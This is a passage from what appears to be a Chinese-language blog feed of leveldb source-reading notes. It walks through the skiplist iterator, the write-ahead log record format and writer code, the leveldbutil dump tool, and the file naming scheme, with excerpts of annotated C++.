class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-Iterator"><a href="#4-Iterator" class="headerlink" title="4. Iterator"></a>4. Iterator</h2><p>前面说了skiplist的两个接口，但是skiplist还提供了一个重要的功能，那就是迭代器，迭代器是用来遍历skiplist的内部节点的。我们一起来分析以下：</p><h3 id="1-基本定义"><a href="#1-基本定义" class="headerlink" title="1. 基本定义"></a>1. 基本定义</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Iteration over the contents of a skip list</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Iterator</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// Initialize an iterator over the specified list.</span></span><br><span class="line">  <span class="comment">// The returned iterator is not valid.</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Iterator</span><span class="params">(<span class="keyword">const</span> SkipList* <span class="built_in">list</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns true iff the iterator is positioned at a valid node.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">Valid</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the key at the current position.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> Key&amp; <span class="title">key</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Advances to the next position.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Next</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Advances to the previous position.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Prev</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Advance to the first entry with a key &gt;= target</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Seek</span><span class="params">(<span class="keyword">const</span> Key&amp; target)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Position at the first entry in list.</span></span><br><span class="line">  <span class="comment">// Final state of iterator is Valid() iff list is not empty.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SeekToFirst</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Position at the last entry in list.</span></span><br><span class="line">  <span class="comment">// Final state of iterator is Valid() iff list is not empty.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SeekToLast</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">const</span> SkipList* list_;</span><br><span class="line">  Node* node_;</span><br><span class="line">  <span class="comment">// Intentionally copyable</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，这个迭代器提供的接口和普通迭代器基本一样，<strong>但没有value</strong>，内部私有成员包含一个skiplist和一个node，毕竟是要遍历skiplist，所以这也很好理解。</p><h3 id="2-Seek"><a href="#2-Seek" class="headerlink" title="2.Seek"></a>2.Seek</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">void</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Iterator::Seek(<span class="keyword">const</span> Key&amp; target) &#123;</span><br><span class="line">  node_ = list_-&gt;FindGreaterOrEqual(target, <span class="literal">nullptr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>seek内部直接调用了skiplist的FindGreaterOrEqual函数，FindGreaterOrEqual除了保存搜索路径外，最终还会返回找到的节点，正好可以用来做seek，并将结果保存在node_</p><h3 id="3-Next"><a href="#3-Next" class="headerlink" title="3. Next"></a>3. Next</h3><p>Next函数很简单，移动到下一个节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">void</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Iterator::Next() &#123;</span><br><span class="line">  assert(Valid());</span><br><span class="line">  node_ = node_-&gt;Next(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-Prev"><a href="#4-Prev" class="headerlink" title="4. Prev"></a>4. Prev</h3><p>prev内部调用了FindLessThan，它和FindGreaterOrEqual类似。其实可以双链表优化，但是双链表会多占用一个prev指针，这里应该算是时间换空间吧。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">void</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Iterator::Prev() &#123;</span><br><span class="line">  <span class="comment">// Instead of using explicit "prev" links, we just search for the</span></span><br><span class="line">  <span class="comment">// last node that falls before key.</span></span><br><span class="line">  assert(Valid());</span><br><span class="line">  node_ = list_-&gt;FindLessThan(node_-&gt;key);</span><br><span class="line">  <span class="keyword">if</span> (node_ == list_-&gt;head_) &#123;</span><br><span class="line">    node_ = <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="5-key"><a href="#5-key" class="headerlink" title="5. key"></a>5. key</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">const</span> <span class="title">Key</span>&amp; <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Iterator::key() <span class="keyword">const</span> &#123;</span><br><span class="line">  assert(Valid());</span><br><span class="line">  <span class="keyword">return</span> node_-&gt;key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里，我们就说完skiplist了，有了skiplist的基础，下文我们将介绍memtable。</p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-log文件</title>
      <link href="/archives/8ea77a40.html"/>
      <url>/archives/8ea77a40.html</url>
      
        <content type="html"><![CDATA[<p>log文件是用来保证写入的持久性的。当用户向系统发出write请求，首先就会将数据写入一份到log文件中，然后再写入到memtable，这是为了防止系统crash而出现数据loss。</p><a id="more"></a><h2 id="1-结构分析"><a href="#1-结构分析" class="headerlink" title="1. 结构分析"></a>1. 结构分析</h2><p>关于log的结构在levedb源码的 doc/log_format.md中有介绍。</p><p>leveldb在内存中的数据结构是memtable，显然memtable是无法保证数据的持久性，因为系统一旦掉电，数据就丢失了，所以leveldb使用了log file来保证数据的持久性。log file具有only append的特点，写入速度快。</p><p>我们曾在<a href="https://www.ravenxrz.ink/archives/1a545f48.html">整体架构</a>中提到过log的结构，这里再说一下：</p><p>leveldb存放的是key-value对，因为键值和value值的长度是可变的，因此，每一笔记录都必须有个<strong>length</strong>字段来表明当前记录的长度。 当然了，leveldb为了校验数据的一致性，同时会计算<strong>checksum</strong>，作为记录的一个字段.</p><p>还有另外一个字段，即<strong>type</strong>。注意，Log文件是分block存放的，每个block的大小为32KB，这就会存在一个问题，如某个key－value对过大，无法存放在单个block中，可能存放在多个不同的block中,因此引入了另一个字段RecordType, 用于标识当前物理快与逻辑块之间的关系。</p><p>RecordType字段主要有以下四种类型：FULL/FIRST/MIDDLE/LAST。</p><ul><li><p>如果 一个Record的size在一个block内，则type=FULL</p></li><li><p>否则Record将会跨越多个block，则可能出现上图中的情况，分别对应FIRST/MIDDLE/LAST</p></li></ul><p>下图展示的 log 文件由 3 个 Block 构成，所以从物理布局来讲，一个 log 文件就是由连续的 32K 大小 Block 构成的。</p><p><img data-src="https://img-blog.csdnimg.cn/20190314203727797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3R1d2VucWkyMDEz,size_16,color_FFFFFF,t_70" alt="img"></p><p>一个Record的逻辑结构如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/log-record%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84.jpg" alt=""></p><h2 id="2-源码分析"><a href="#2-源码分析" class="headerlink" title="2. 源码分析"></a>2. 源码分析</h2><p>与log相关的代码文件存放在：</p><ul><li>db/log_format.h</li><li>db/log_reader.h</li><li>db/log_reader.cc</li><li>db/log_writer.h</li><li>db/log_writer.cc</li></ul><h3 id="1-leveldb-log命名空间"><a href="#1-leveldb-log命名空间" class="headerlink" title="1. leveldb::log命名空间"></a>1. leveldb::log命名空间</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> leveldb &#123;</span><br><span class="line"><span class="keyword">namespace</span> <span class="built_in">log</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RecordType &#123;</span><br><span class="line">  <span class="comment">// Zero is reserved for preallocated files</span></span><br><span class="line">  kZeroType = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">  kFullType = <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// For fragments</span></span><br><span class="line">  kFirstType = <span class="number">2</span>,</span><br><span class="line">  kMiddleType = <span class="number">3</span>,</span><br><span class="line">  kLastType = <span class="number">4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxRecordType = kLastType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kBlockSize = <span class="number">32768</span>;<span class="comment">// 1个block 32kb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Header is checksum (4 bytes), length (2 bytes), type (1 byte).</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kHeaderSize = <span class="number">4</span> + <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace log</span></span><br><span class="line">&#125;  <span class="comment">// namespace leveldb</span></span><br></pre></td></tr></table></figure><h3 id="2-写操作"><a href="#2-写操作" class="headerlink" title="2. 写操作"></a>2. 写操作</h3><p>log wirter类，对log写入的封装：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> leveldb &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WritableFile</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="built_in">log</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Writer</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// Create a writer that will append data to "*dest".</span></span><br><span class="line">  <span class="comment">// "*dest" must be initially empty.</span></span><br><span class="line">  <span class="comment">// "*dest" must remain live while this Writer is in use.</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Writer</span><span class="params">(WritableFile* dest)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create a writer that will append data to "*dest".</span></span><br><span class="line">  <span class="comment">// "*dest" must have initial length "dest_length".</span></span><br><span class="line">  <span class="comment">// "*dest" must remain live while this Writer is in use.</span></span><br><span class="line">  Writer(WritableFile* dest, <span class="keyword">uint64_t</span> dest_length);</span><br><span class="line"></span><br><span class="line">  Writer(<span class="keyword">const</span> Writer&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  Writer&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Writer&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  ~Writer();</span><br><span class="line"></span><br><span class="line">  <span class="function">Status <span class="title">AddRecord</span><span class="params">(<span class="keyword">const</span> Slice&amp; slice)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function">Status <span class="title">EmitPhysicalRecord</span><span class="params">(RecordType type, <span class="keyword">const</span> <span class="keyword">char</span>* ptr, <span class="keyword">size_t</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line">  WritableFile* dest_;</span><br><span class="line">  <span class="keyword">int</span> block_offset_;  <span class="comment">// Curr </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预计算的crc</span></span><br><span class="line">  <span class="comment">// crc32c values for all supported record types.  These are</span></span><br><span class="line">  <span class="comment">// pre-computed to reduce the overhead of computing the crc of the</span></span><br><span class="line">  <span class="comment">// record type stored in the header.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> type_crc_[kMaxRecordType + <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace log</span></span><br><span class="line">&#125;  <span class="comment">// namespace leveldb</span></span><br></pre></td></tr></table></figure><h4 id="核心-AddRecord-函数"><a href="#核心-AddRecord-函数" class="headerlink" title="核心-AddRecord 函数"></a>核心-AddRecord 函数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">Writer::AddRecord</span><span class="params">(<span class="keyword">const</span> Slice&amp; slice)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* ptr = slice.data();</span><br><span class="line">  <span class="keyword">size_t</span> left = slice.<span class="built_in">size</span>();<span class="comment">// left表示剩余多少size未写</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fragment the record if necessary and emit it.  Note that if slice</span></span><br><span class="line">  <span class="comment">// is empty, we still want to iterate once to emit a single</span></span><br><span class="line">  <span class="comment">// zero-length record</span></span><br><span class="line">  Status s;</span><br><span class="line">  <span class="keyword">bool</span> <span class="built_in">begin</span> = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> leftover = kBlockSize - block_offset_;<span class="comment">// 当前32kb的块的剩余量</span></span><br><span class="line">    assert(leftover &gt;= <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (leftover &lt; kHeaderSize) &#123;<span class="comment">// 剩余量 &lt; 一个record的header size</span></span><br><span class="line">      <span class="comment">// Switch to a new block</span></span><br><span class="line">      <span class="keyword">if</span> (leftover &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Fill the trailer (literal below relies on kHeaderSize being 7)</span></span><br><span class="line">        <span class="keyword">static_assert</span>(kHeaderSize == <span class="number">7</span>, <span class="string">""</span>);</span><br><span class="line">        dest_-&gt;Append(Slice(<span class="string">"\x00\x00\x00\x00\x00\x00"</span>, leftover));<span class="comment">// 填充本块最后的空间</span></span><br><span class="line">      &#125;</span><br><span class="line">      block_offset_ = <span class="number">0</span>; <span class="comment">// 更换新块</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Invariant: we never leave &lt; kHeaderSize bytes in a block.</span></span><br><span class="line">    assert(kBlockSize - block_offset_ - kHeaderSize &gt;= <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> avail = kBlockSize - block_offset_ - kHeaderSize;<span class="comment">// 剩余可用给数据的空间</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> fragment_length = (left &lt; avail) ? left : avail;</span><br><span class="line"></span><br><span class="line">    RecordType type;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">bool</span> <span class="built_in">end</span> = (left == fragment_length);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">begin</span> &amp;&amp; <span class="built_in">end</span>) &#123;<span class="comment">// 开始和结束都在本块，整条record都可放置</span></span><br><span class="line">      type = kFullType;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">begin</span>) &#123;<span class="comment">// 只有开始在，结束不在，说明是第一条</span></span><br><span class="line">      type = kFirstType;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">end</span>) &#123;<span class="comment">// 结束在，开始不在，说明是最后一条</span></span><br><span class="line">      type = kLastType;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 其余就是中间条目</span></span><br><span class="line">      type = kMiddleType;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 将本条Record写入到物理设备上</span></span><br><span class="line">    s = EmitPhysicalRecord(type, ptr, fragment_length);</span><br><span class="line">    ptr += fragment_length;</span><br><span class="line">    left -= fragment_length;</span><br><span class="line">    <span class="built_in">begin</span> = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> (s.ok() &amp;&amp; left &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本流程如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/AddRecord%E5%87%BD%E6%95%B0%E6%B5%81%E7%A8%8B%E5%9B%BE-1600848090666.jpg" alt=""></p><h4 id="EmitPhysicalRecord函数"><a href="#EmitPhysicalRecord函数" class="headerlink" title="EmitPhysicalRecord函数"></a>EmitPhysicalRecord函数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">Writer::EmitPhysicalRecord</span><span class="params">(RecordType t, <span class="keyword">const</span> <span class="keyword">char</span>* ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">size_t</span> length)</span> </span>&#123;</span><br><span class="line">  assert(length &lt;= <span class="number">0xffff</span>);  <span class="comment">// Must fit in two bytes 一个块最多写32kb，即2^15，至少需要15个bit，所以需要2个字节（解释了为什么要用0xffff)</span></span><br><span class="line">  assert(block_offset_ + kHeaderSize + length &lt;= kBlockSize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Format the header</span></span><br><span class="line">  <span class="keyword">char</span> buf[kHeaderSize];</span><br><span class="line">   <span class="comment">// 初始化header， 4-5为数据的length， 6 为类型</span></span><br><span class="line">  buf[<span class="number">4</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(length &amp; <span class="number">0xff</span>);</span><br><span class="line">  buf[<span class="number">5</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(length &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  buf[<span class="number">6</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(t);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Compute the crc of the record type and the payload.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> crc = crc32c::Extend(type_crc_[t], ptr, length);</span><br><span class="line">  crc = crc32c::Mask(crc);  <span class="comment">// Adjust for storage</span></span><br><span class="line">    <span class="comment">// crc校验</span></span><br><span class="line">  EncodeFixed32(buf, crc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write the header and the payload</span></span><br><span class="line">  Status s = dest_-&gt;Append(Slice(buf, kHeaderSize));<span class="comment">// 加入heder</span></span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    s = dest_-&gt;Append(Slice(ptr, length));<span class="comment">// 加如实际数据</span></span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      s = dest_-&gt;Flush();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  block_offset_ += kHeaderSize + length;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数相对简单：</p><ol><li>检查写入数据的length是否符合条件。满足在2个字节以内。</li><li>填充record的元数据， length + type + crc校验码</li><li>写入到dest_中。</li></ol><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>本文介绍了leveldb中用来保证持久性的log文件，重点介绍了它的逻辑布局和物理布局，同时介绍了一次log写入操作是如何执行的。</p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-leveldbutil工具</title>
      <link href="/archives/2938ff32.html"/>
      <url>/archives/2938ff32.html</url>
      
        <content type="html"><![CDATA[<p>从本文之后，我们将正式分析leveldb内部组件，如memtable,sstable, log, manifest等。</p><a id="more"></a><p> 如果你已经搭建了leveldb的源码debug环境并做过简单测试，你会发现leveldb中存在以下几类文件：</p><ul><li>sstable文件，sst或ldb结尾</li><li>log文件，保证写入的持久性</li><li>MANIFEST, 记录每次修改操作的增量，记录sstable的元数据</li><li>CURRENT， 指向当前该使用哪个MANIFEST</li><li>LOCK 锁相关</li><li>LOG.old 日志</li></ul><p>一般情况下，除了CURRENT和LOG.old文件可以双击查看，其它文件都是没办法查看的，因为它们都不是txt文件，而是经过leveldb按照自身设计而存储的。但是有没有办法查看这些文件的内容呢？有，leveldb为我们提供了一个工具—<strong>leveldb/db/leveldbutil.cc</strong></p><p>我们将它编译成可执行文件后，执行 ./levelutil dump [要查看的文件] 即可打印相关文件的信息，如，我要查看log文件：</p><p><img data-src="https://pic.downk.cc/item/5f81b4da1cd1bbb86b526c02.jpg" alt=""></p><p>知道了这个工具，在后续查看文件布局时就会比较方便了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章介绍了查看 log、sstable、manifest等文件的工具–leveldbutil. 文本是”前置知识“的最后一篇，从下文开始，我们将分析leveldb中log文件。</p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-文件命名规则</title>
      <link href="/archives/f38b067b.html"/>
      <url>/archives/f38b067b.html</url>
      
        <content type="html"><![CDATA[<p>本片文章我们说一说leveldb中的文件命名规则。</p><blockquote><p>这篇文章虽然放在前置知识，但是内部原理牵涉到leveldb中的Version相关类，所以看不懂没关系，只用知道一个结论：leveldb的所有带编号的文件共用一套编号系统，也就是说任何带编号的文件不可能有重复的编号。如不会出现 000001.ldb和000001.log文件这种情况。</p></blockquote><a id="more"></a><p>运行leveldb程序一段时间后，我们会发现在系统给中，存在很多由数字编号的文件：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20201009111936923.png" alt="image-20201009111936923"></p><p>这篇文章从整体上谈一谈leveldb的文件命令和文件编号的来源。</p><h2 id="1-文件命名"><a href="#1-文件命名" class="headerlink" title="1. 文件命名"></a>1. 文件命名</h2><p>在leveldb中和文件命名相关的代码在：</p><ul><li>leveldb/db/filename.cc</li><li>leveldb/db/filename.h</li></ul><p>其核心为MakeFileName函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">MakeFileName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">uint64_t</span> number,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">const</span> <span class="keyword">char</span>* suffix)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"/%06llu.%s"</span>,</span><br><span class="line">                <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(number), suffix);</span><br><span class="line">  <span class="keyword">return</span> dbname + buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到文件名时由 dbname + 6位number + 后缀组成的。 比如dbname = testdb, 则一个sstable的文件名可以为： testdb/000132.ldb. (ldb和sst都是sstable的有效后缀)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">TableFileName</span><span class="params">(<span 